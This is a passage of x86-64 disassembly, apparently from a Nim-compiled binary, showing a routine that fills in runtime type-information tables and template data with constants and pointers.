  4094b5:	c6 05 94 08 02 00 01 	movb   $0x1,0x20894(%rip)        # 429d50 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x90>
  4094bc:	48 c7 05 91 08 02 00 	movq   $0x0,0x20891(%rip)        # 429d58 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x98>
  4094c3:	00 00 00 00 
  4094c7:	4c 89 35 92 08 02 00 	mov    %r14,0x20892(%rip)        # 429d60 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xa0>
  4094ce:	48 89 35 93 08 02 00 	mov    %rsi,0x20893(%rip)        # 429d68 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xa8>
  4094d5:	c6 05 a4 08 02 00 01 	movb   $0x1,0x208a4(%rip)        # 429d80 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xc0>
  4094dc:	48 c7 05 a1 08 02 00 	movq   $0x8,0x208a1(%rip)        # 429d88 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xc8>
  4094e3:	08 00 00 00 
  4094e7:	4c 89 2d a2 08 02 00 	mov    %r13,0x208a2(%rip)        # 429d90 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xd0>
  4094ee:	48 89 1d a3 08 02 00 	mov    %rbx,0x208a3(%rip)        # 429d98 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xd8>
  4094f5:	48 c7 05 40 08 02 00 	movq   $0x2,0x20840(%rip)        # 429d40 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x80>
  4094fc:	02 00 00 00 
  409500:	c6 05 19 08 02 00 02 	movb   $0x2,0x20819(%rip)        # 429d20 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x60>
  409507:	c6 05 e2 07 02 00 01 	movb   $0x1,0x207e2(%rip)        # 429cf0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x30>
  40950e:	48 c7 05 df 07 02 00 	movq   $0x0,0x207df(%rip)        # 429cf8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x38>
  409515:	00 00 00 00 
  409519:	c6 05 90 08 02 00 01 	movb   $0x1,0x20890(%rip)        # 429db0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xf0>
  409520:	48 c7 05 8d 08 02 00 	movq   $0x10,0x2088d(%rip)        # 429db8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xf8>
  409527:	10 00 00 00 
  40952b:	c6 05 ae 08 02 00 01 	movb   $0x1,0x208ae(%rip)        # 429de0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x120>
  409532:	48 89 05 bf 08 02 00 	mov    %rax,0x208bf(%rip)        # 429df8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x138>
  409539:	48 8d 05 d0 08 02 00 	lea    0x208d0(%rip),%rax        # 429e10 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480>
  409540:	48 89 05 a1 07 02 00 	mov    %rax,0x207a1(%rip)        # 429ce8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x28>
  409547:	48 8d 82 10 ff ff ff 	lea    -0xf0(%rdx),%rax
  40954e:	48 89 05 03 09 02 00 	mov    %rax,0x20903(%rip)        # 429e58 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_+0x18>
  409555:	48 8d 15 64 09 02 00 	lea    0x20964(%rip),%rdx        # 429ec0 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165>
  40955c:	48 8d 05 32 9f ff ff 	lea    -0x60ce(%rip),%rax        # 403495 <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ>
  409563:	48 89 15 ee 13 02 00 	mov    %rdx,0x213ee(%rip)        # 42a958 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_+0x18>
  40956a:	48 89 05 37 09 02 00 	mov    %rax,0x20937(%rip)        # 429ea8 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_+0x28>
  409571:	48 8d 15 38 0a 02 00 	lea    0x20a38(%rip),%rdx        # 429fb0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x30>
  409578:	48 8d 05 a1 14 02 00 	lea    0x214a1(%rip),%rax        # 42aa20 <NTI__5aoVPIWYzahUyBc9bMm0M5w_>
  40957f:	48 89 15 1a 0b 02 00 	mov    %rdx,0x20b1a(%rip)        # 42a0a0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150>
  409586:	48 89 05 83 09 02 00 	mov    %rax,0x20983(%rip)        # 429f10 <NTI__oKfdUHDH0q5oP14wOM6kug_+0x10>
  40958d:	48 8d 15 ac 09 02 00 	lea    0x209ac(%rip),%rdx        # 429f40 <NTI__WF89a8QyKeDCh4DYWTmSiBg_>
  409594:	48 8d 05 8b 9e ff ff 	lea    -0x6175(%rip),%rax        # 403426 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug>
  40959b:	48 89 15 1e 0a 02 00 	mov    %rdx,0x20a1e(%rip)        # 429fc0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x40>
  4095a2:	48 89 05 7f 09 02 00 	mov    %rax,0x2097f(%rip)        # 429f28 <NTI__oKfdUHDH0q5oP14wOM6kug_+0x28>
  4095a9:	48 8d 15 30 0a 02 00 	lea    0x20a30(%rip),%rdx        # 429fe0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x60>
  4095b0:	48 8d 05 49 09 02 00 	lea    0x20949(%rip),%rax        # 429f00 <NTI__oKfdUHDH0q5oP14wOM6kug_>
  4095b7:	48 89 15 ea 0a 02 00 	mov    %rdx,0x20aea(%rip)        # 42a0a8 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x8>
  4095be:	48 83 c2 30          	add    $0x30,%rdx
  4095c2:	48 89 05 07 09 02 00 	mov    %rax,0x20907(%rip)        # 429ed0 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165+0x10>
  4095c9:	48 8d 05 2d 2e 00 00 	lea    0x2e2d(%rip),%rax        # 40c3fd <.rdata+0x3fd>
  4095d0:	48 89 3d 19 08 02 00 	mov    %rdi,0x20819(%rip)        # 429df0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x130>
  4095d7:	48 89 3d b2 08 02 00 	mov    %rdi,0x208b2(%rip)        # 429e90 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_+0x10>
  4095de:	48 89 05 f3 08 02 00 	mov    %rax,0x208f3(%rip)        # 429ed8 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165+0x18>
  4095e5:	48 89 05 dc 09 02 00 	mov    %rax,0x209dc(%rip)        # 429fc8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x48>
  4095ec:	48 c7 05 f1 07 02 00 	movq   $0x20,0x207f1(%rip)        # 429de8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x128>
  4095f3:	20 00 00 00 
  4095f7:	48 c7 05 de 06 02 00 	movq   $0x3,0x206de(%rip)        # 429ce0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x20>
  4095fe:	03 00 00 00 
  409602:	c6 05 b7 06 02 00 02 	movb   $0x2,0x206b7(%rip)        # 429cc0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482>
  409609:	48 c7 05 6c 08 02 00 	movq   $0x8,0x2086c(%rip)        # 429e80 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_>
  409610:	08 00 00 00 
  409614:	66 c7 05 6b 08 02 00 	movw   $0x218,0x2086b(%rip)        # 429e88 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_+0x8>
  40961b:	18 02 
  40961d:	48 c7 05 18 13 02 00 	movq   $0x8,0x21318(%rip)        # 42a940 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_>
  409624:	08 00 00 00 
  409628:	c6 05 19 13 02 00 12 	movb   $0x12,0x21319(%rip)        # 42a948 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_+0x8>
  40962f:	48 c7 05 16 13 02 00 	movq   $0x0,0x21316(%rip)        # 42a950 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_+0x10>
  409636:	00 00 00 00 
  40963a:	48 c7 05 bb 08 02 00 	movq   $0x8,0x208bb(%rip)        # 429f00 <NTI__oKfdUHDH0q5oP14wOM6kug_>
  409641:	08 00 00 00 
  409645:	c6 05 bc 08 02 00 18 	movb   $0x18,0x208bc(%rip)        # 429f08 <NTI__oKfdUHDH0q5oP14wOM6kug_+0x8>
  40964c:	c6 05 6d 08 02 00 01 	movb   $0x1,0x2086d(%rip)        # 429ec0 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165>
  409653:	48 c7 05 6a 08 02 00 	movq   $0x0,0x2086a(%rip)        # 429ec8 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165+0x8>
  40965a:	00 00 00 00 
  40965e:	48 c7 05 97 12 02 00 	movq   $0x28,0x21297(%rip)        # 42a900 <NTI__oL07LSXp3QMM0uEpFQiyQg_>
  409665:	28 00 00 00 
  409669:	c6 05 98 12 02 00 12 	movb   $0x12,0x21298(%rip)        # 42a908 <NTI__oL07LSXp3QMM0uEpFQiyQg_+0x8>
  409670:	48 c7 05 95 12 02 00 	movq   $0x0,0x21295(%rip)        # 42a910 <NTI__oL07LSXp3QMM0uEpFQiyQg_+0x10>
  409677:	00 00 00 00 
  40967b:	c6 05 2e 09 02 00 01 	movb   $0x1,0x2092e(%rip)        # 429fb0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x30>
  409682:	48 c7 05 2b 09 02 00 	movq   $0x0,0x2092b(%rip)        # 429fb8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x38>
  409689:	00 00 00 00 
  40968d:	c6 05 4c 09 02 00 01 	movb   $0x1,0x2094c(%rip)        # 429fe0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x60>
  409694:	48 89 0d 5d 09 02 00 	mov    %rcx,0x2095d(%rip)        # 429ff8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x78>
  40969b:	48 8d 0d 65 2d 00 00 	lea    0x2d65(%rip),%rcx        # 40c407 <.rdata+0x407>
  4096a2:	48 89 15 07 0a 02 00 	mov    %rdx,0x20a07(%rip)        # 42a0b0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x10>
  4096a9:	48 83 c2 30          	add    $0x30,%rdx
  4096ad:	48 89 0d 74 09 02 00 	mov    %rcx,0x20974(%rip)        # 42a028 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xa8>
  4096b4:	48 8d 0d 51 2d 00 00 	lea    0x2d51(%rip),%rcx        # 40c40c <.rdata+0x40c>
  4096bb:	48 89 15 f6 09 02 00 	mov    %rdx,0x209f6(%rip)        # 42a0b8 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x18>
  4096c2:	48 83 c2 30          	add    $0x30,%rdx
  4096c6:	48 89 0d 8b 09 02 00 	mov    %rcx,0x2098b(%rip)        # 42a058 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xd8>
  4096cd:	48 8d 0d 3e 2d 00 00 	lea    0x2d3e(%rip),%rcx        # 40c412 <.rdata+0x412>
  4096d4:	48 89 15 e5 09 02 00 	mov    %rdx,0x209e5(%rip)        # 42a0c0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x20>
  4096db:	48 8d 15 be 09 02 00 	lea    0x209be(%rip),%rdx        # 42a0a0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150>
  4096e2:	48 89 0d 9f 09 02 00 	mov    %rcx,0x2099f(%rip)        # 42a088 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x108>
  4096e9:	48 8d 0d 90 08 02 00 	lea    0x20890(%rip),%rcx        # 429f80 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151>
  4096f0:	48 89 15 b1 08 02 00 	mov    %rdx,0x208b1(%rip)        # 429fa8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x28>
  4096f7:	48 8d 15 92 0c 02 00 	lea    0x20c92(%rip),%rdx        # 42a390 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x30>
  4096fe:	48 89 0d 13 12 02 00 	mov    %rcx,0x21213(%rip)        # 42a918 <NTI__oL07LSXp3QMM0uEpFQiyQg_+0x18>
  409705:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
  409709:	48 89 0d 98 0e 02 00 	mov    %rcx,0x20e98(%rip)        # 42a5a8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_2_2.52490+0x8>
  409710:	48 83 c1 60          	add    $0x60,%rcx
  409714:	48 89 15 85 0e 02 00 	mov    %rdx,0x20e85(%rip)        # 42a5a0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_2_2.52490>
  40971b:	48 8d 15 7e 0e 02 00 	lea    0x20e7e(%rip),%rdx        # 42a5a0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_2_2.52490>
  409722:	48 c7 05 bb 08 02 00 	movq   $0x8,0x208bb(%rip)        # 429fe8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x68>
  409729:	08 00 00 00 
  40972d:	4c 89 3d bc 08 02 00 	mov    %r15,0x208bc(%rip)        # 429ff0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x70>
  409734:	c6 05 d5 08 02 00 01 	movb   $0x1,0x208d5(%rip)        # 42a010 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x90>
  40973b:	48 c7 05 d2 08 02 00 	movq   $0x10,0x208d2(%rip)        # 42a018 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x98>
  409742:	10 00 00 00 
  409746:	4c 89 3d d3 08 02 00 	mov    %r15,0x208d3(%rip)        # 42a020 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xa0>
  40974d:	c6 05 ec 08 02 00 01 	movb   $0x1,0x208ec(%rip)        # 42a040 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xc0>
  409754:	48 c7 05 e9 08 02 00 	movq   $0x18,0x208e9(%rip)        # 42a048 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xc8>
  40975b:	18 00 00 00 
  40975f:	4c 89 3d ea 08 02 00 	mov    %r15,0x208ea(%rip)        # 42a050 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xd0>
  409766:	c6 05 03 09 02 00 01 	movb   $0x1,0x20903(%rip)        # 42a070 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xf0>
  40976d:	48 c7 05 00 09 02 00 	movq   $0x20,0x20900(%rip)        # 42a078 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xf8>
  409774:	20 00 00 00 
  409778:	4c 89 3d 01 09 02 00 	mov    %r15,0x20901(%rip)        # 42a080 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x100>
  40977f:	48 c7 05 16 08 02 00 	movq   $0x5,0x20816(%rip)        # 429fa0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x20>
  409786:	05 00 00 00 
  40978a:	c6 05 ef 07 02 00 02 	movb   $0x2,0x207ef(%rip)        # 429f80 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151>
  409791:	c6 05 f8 0b 02 00 01 	movb   $0x1,0x20bf8(%rip)        # 42a390 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x30>
  409798:	48 c7 05 f5 0b 02 00 	movq   $0x0,0x20bf5(%rip)        # 42a398 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x38>
  40979f:	00 00 00 00 
  4097a3:	4c 89 35 f6 0b 02 00 	mov    %r14,0x20bf6(%rip)        # 42a3a0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x40>
  4097aa:	48 89 35 f7 0b 02 00 	mov    %rsi,0x20bf7(%rip)        # 42a3a8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x48>
  4097b1:	c6 05 08 0c 02 00 01 	movb   $0x1,0x20c08(%rip)        # 42a3c0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x60>
  4097b8:	48 c7 05 05 0c 02 00 	movq   $0x8,0x20c05(%rip)        # 42a3c8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x68>
  4097bf:	08 00 00 00 
  4097c3:	4c 89 2d 06 0c 02 00 	mov    %r13,0x20c06(%rip)        # 42a3d0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x70>
  4097ca:	48 89 1d 07 0c 02 00 	mov    %rbx,0x20c07(%rip)        # 42a3d8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x78>
  4097d1:	48 c7 05 a4 0b 02 00 	movq   $0x2,0x20ba4(%rip)        # 42a380 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x20>
  4097d8:	02 00 00 00 
  4097dc:	48 89 0d 9d 0a 02 00 	mov    %rcx,0x20a9d(%rip)        # 42a280 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491>
  4097e3:	48 83 c1 60          	add    $0x60,%rcx
  4097e7:	48 89 0d 32 0a 02 00 	mov    %rcx,0x20a32(%rip)        # 42a220 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_5_2.52492>
  4097ee:	48 8d 0d eb 09 02 00 	lea    0x209eb(%rip),%rcx        # 42a1e0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_>
  4097f5:	48 89 0d 94 0c 02 00 	mov    %rcx,0x20c94(%rip)        # 42a490 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x130>
  4097fc:	48 8d 0d 14 2c 00 00 	lea    0x2c14(%rip),%rcx        # 40c417 <.rdata+0x417>
  409803:	48 89 0d 8e 0c 02 00 	mov    %rcx,0x20c8e(%rip)        # 42a498 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x138>
  40980a:	48 8d 0d 9f 0c 02 00 	lea    0x20c9f(%rip),%rcx        # 42a4b0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x150>
  409811:	48 89 0d 10 0a 02 00 	mov    %rcx,0x20a10(%rip)        # 42a228 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_5_2.52492+0x8>
  409818:	48 8d 0d c4 9b ff ff 	lea    -0x643c(%rip),%rcx        # 4033e3 <Marker_tyRef__gcUT3qWwCET3KjsqW7m5vQ>
  40981f:	48 89 0d a2 09 02 00 	mov    %rcx,0x209a2(%rip)        # 42a1c8 <NTI__gcUT3qWwCET3KjsqW7m5vQ_+0x28>
  409826:	48 8d 0d 73 09 02 00 	lea    0x20973(%rip),%rcx        # 42a1a0 <NTI__gcUT3qWwCET3KjsqW7m5vQ_>
  40982d:	48 89 0d 8c 0c 02 00 	mov    %rcx,0x20c8c(%rip)        # 42a4c0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x160>
  409834:	48 8d 0d e5 2b 00 00 	lea    0x2be5(%rip),%rcx        # 40c420 <.rdata+0x420>
  40983b:	48 89 0d 86 0c 02 00 	mov    %rcx,0x20c86(%rip)        # 42a4c8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x168>
  409842:	48 8d 0d d7 09 02 00 	lea    0x209d7(%rip),%rcx        # 42a220 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_5_2.52492>
  409849:	48 89 0d 28 0c 02 00 	mov    %rcx,0x20c28(%rip)        # 42a478 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x118>
  409850:	48 8d 0d f9 0b 02 00 	lea    0x20bf9(%rip),%rcx        # 42a450 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xf0>
  409857:	48 89 15 2a 0b 02 00 	mov    %rdx,0x20b2a(%rip)        # 42a388 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x28>
  40985e:	48 8d 15 db 09 02 00 	lea    0x209db(%rip),%rdx        # 42a240 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_>
  409865:	48 89 0d ec 09 02 00 	mov    %rcx,0x209ec(%rip)        # 42a258 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_+0x18>
  40986c:	48 81 c1 90 00 00 00 	add    $0x90,%rcx
  409873:	48 89 15 36 09 02 00 	mov    %rdx,0x20936(%rip)        # 42a1b0 <NTI__gcUT3qWwCET3KjsqW7m5vQ_+0x10>
  40987a:	48 89 15 af 0b 02 00 	mov    %rdx,0x20baf(%rip)        # 42a430 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xd0>
  409881:	48 8d 15 9d 2b 00 00 	lea    0x2b9d(%rip),%rdx        # 40c425 <.rdata+0x425>
  409888:	48 89 0d f9 09 02 00 	mov    %rcx,0x209f9(%rip)        # 42a288 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491+0x8>
  40988f:	48 8d 0d ca 08 02 00 	lea    0x208ca(%rip),%rcx        # 42a160 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_>
  409896:	48 89 15 9b 0b 02 00 	mov    %rdx,0x20b9b(%rip)        # 42a438 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xd8>
  40989d:	c6 05 bc 0a 02 00 02 	movb   $0x2,0x20abc(%rip)        # 42a360 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493>
  4098a4:	48 c7 05 f1 09 02 00 	movq   $0x38,0x209f1(%rip)        # 42a2a0 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_>
  4098ab:	38 00 00 00 
  4098af:	c6 05 f2 09 02 00 11 	movb   $0x11,0x209f2(%rip)        # 42a2a8 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_+0x8>
  4098b6:	48 89 2d f3 09 02 00 	mov    %rbp,0x209f3(%rip)        # 42a2b0 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_+0x10>
  4098bd:	48 c7 05 78 09 02 00 	movq   $0x18,0x20978(%rip)        # 42a240 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_>
  4098c4:	18 00 00 00 
  4098c8:	c6 05 79 09 02 00 12 	movb   $0x12,0x20979(%rip)        # 42a248 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_+0x8>
  4098cf:	48 c7 05 76 09 02 00 	movq   $0x0,0x20976(%rip)        # 42a250 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_+0x10>
  4098d6:	00 00 00 00 
  4098da:	c6 05 9f 0b 02 00 01 	movb   $0x1,0x20b9f(%rip)        # 42a480 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x120>
  4098e1:	48 c7 05 9c 0b 02 00 	movq   $0x0,0x20b9c(%rip)        # 42a488 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x128>
  4098e8:	00 00 00 00 
  4098ec:	48 c7 05 a9 08 02 00 	movq   $0x8,0x208a9(%rip)        # 42a1a0 <NTI__gcUT3qWwCET3KjsqW7m5vQ_>
  4098f3:	08 00 00 00 
  4098f7:	c6 05 aa 08 02 00 16 	movb   $0x16,0x208aa(%rip)        # 42a1a8 <NTI__gcUT3qWwCET3KjsqW7m5vQ_+0x8>
  4098fe:	c6 05 ab 0b 02 00 01 	movb   $0x1,0x20bab(%rip)        # 42a4b0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x150>
  409905:	48 c7 05 a8 0b 02 00 	movq   $0x10,0x20ba8(%rip)        # 42a4b8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x158>
  40990c:	10 00 00 00 
  409910:	48 c7 05 55 0b 02 00 	movq   $0x2,0x20b55(%rip)        # 42a470 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x110>
  409917:	02 00 00 00 
  40991b:	c6 05 2e 0b 02 00 02 	movb   $0x2,0x20b2e(%rip)        # 42a450 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xf0>
  409922:	c6 05 f7 0a 02 00 01 	movb   $0x1,0x20af7(%rip)        # 42a420 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xc0>
  409929:	48 c7 05 f4 0a 02 00 	movq   $0x8,0x20af4(%rip)        # 42a428 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xc8>
  409930:	08 00 00 00 
  409934:	c6 05 a5 0b 02 00 01 	movb   $0x1,0x20ba5(%rip)        # 42a4e0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x180>
  40993b:	48 89 0d ae 0b 02 00 	mov    %rcx,0x20bae(%rip)        # 42a4f0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x190>
  409942:	48 8d 0d e6 2a 00 00 	lea    0x2ae6(%rip),%rcx        # 40c42f <.rdata+0x42f>
  409949:	48 89 0d a8 0b 02 00 	mov    %rcx,0x20ba8(%rip)        # 42a4f8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x198>
  409950:	48 8d 0d b9 0b 02 00 	lea    0x20bb9(%rip),%rcx        # 42a510 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1b0>
  409957:	48 89 0d 32 09 02 00 	mov    %rcx,0x20932(%rip)        # 42a290 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491+0x10>
  40995e:	48 8d 0d d3 2a 00 00 	lea    0x2ad3(%rip),%rcx        # 40c438 <.rdata+0x438>
  409965:	48 89 3d e4 0b 02 00 	mov    %rdi,0x20be4(%rip)        # 42a550 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1f0>
  40996c:	48 8d 3d cb 2a 00 00 	lea    0x2acb(%rip),%rdi        # 40c43e <.rdata+0x43e>
  409973:	48 89 0d ae 0b 02 00 	mov    %rcx,0x20bae(%rip)        # 42a528 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1c8>
  40997a:	48 8d 0d bf 0b 02 00 	lea    0x20bbf(%rip),%rcx        # 42a540 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1e0>
  409981:	48 89 3d d0 0b 02 00 	mov    %rdi,0x20bd0(%rip)        # 42a558 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1f8>
  409988:	48 8d 3d f1 08 02 00 	lea    0x208f1(%rip),%rdi        # 42a280 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491>
  40998f:	48 89 3d 82 0a 02 00 	mov    %rdi,0x20a82(%rip)        # 42a418 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xb8>
  409996:	48 8d b9 b0 fe ff ff 	lea    -0x150(%rcx),%rdi
  40999d:	48 89 3d 14 09 02 00 	mov    %rdi,0x20914(%rip)        # 42a2b8 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_+0x18>
  4099a4:	48 8d 3d f5 08 02 00 	lea    0x208f5(%rip),%rdi        # 42a2a0 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_>
  4099ab:	48 89 3d 3e 07 02 00 	mov    %rdi,0x2073e(%rip)        # 42a0f0 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_+0x10>
  4099b2:	48 8d 79 30          	lea    0x30(%rcx),%rdi
  4099b6:	48 89 3d 3b 07 02 00 	mov    %rdi,0x2073b(%rip)        # 42a0f8 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_+0x18>
  4099bd:	48 8d 3d 1c 07 02 00 	lea    0x2071c(%rip),%rdi        # 42a0e0 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_>
  4099c4:	48 89 3d c5 0f 02 00 	mov    %rdi,0x20fc5(%rip)        # 42a990 <NTI__TjokxNjmnZmr9bygVDVC9bvg_+0x10>
  4099cb:	48 8d 3d d3 99 ff ff 	lea    -0x662d(%rip),%rdi        # 4033a5 <Marker_tyRef__TjokxNjmnZmr9bygVDVC9bvg>
  4099d2:	48 89 3d cf 0f 02 00 	mov    %rdi,0x20fcf(%rip)        # 42a9a8 <NTI__TjokxNjmnZmr9bygVDVC9bvg_+0x28>
  4099d9:	48 8d 3d e0 0b 02 00 	lea    0x20be0(%rip),%rdi        # 42a5c0 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_>
  4099e0:	48 89 0d b1 08 02 00 	mov    %rcx,0x208b1(%rip)        # 42a298 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491+0x18>
  4099e7:	48 8d 0d f2 7d 00 00 	lea    0x7df2(%rip),%rcx        # 4117e0 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_4>
  4099ee:	48 c7 05 ef 0a 02 00 	movq   $0x20,0x20aef(%rip)        # 42a4e8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x188>
  4099f5:	20 00 00 00 
  4099f9:	c6 05 10 0b 02 00 01 	movb   $0x1,0x20b10(%rip)        # 42a510 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1b0>
  409a00:	48 c7 05 0d 0b 02 00 	movq   $0x28,0x20b0d(%rip)        # 42a518 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1b8>
  409a07:	28 00 00 00 
  409a0b:	4c 89 25 0e 0b 02 00 	mov    %r12,0x20b0e(%rip)        # 42a520 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1c0>
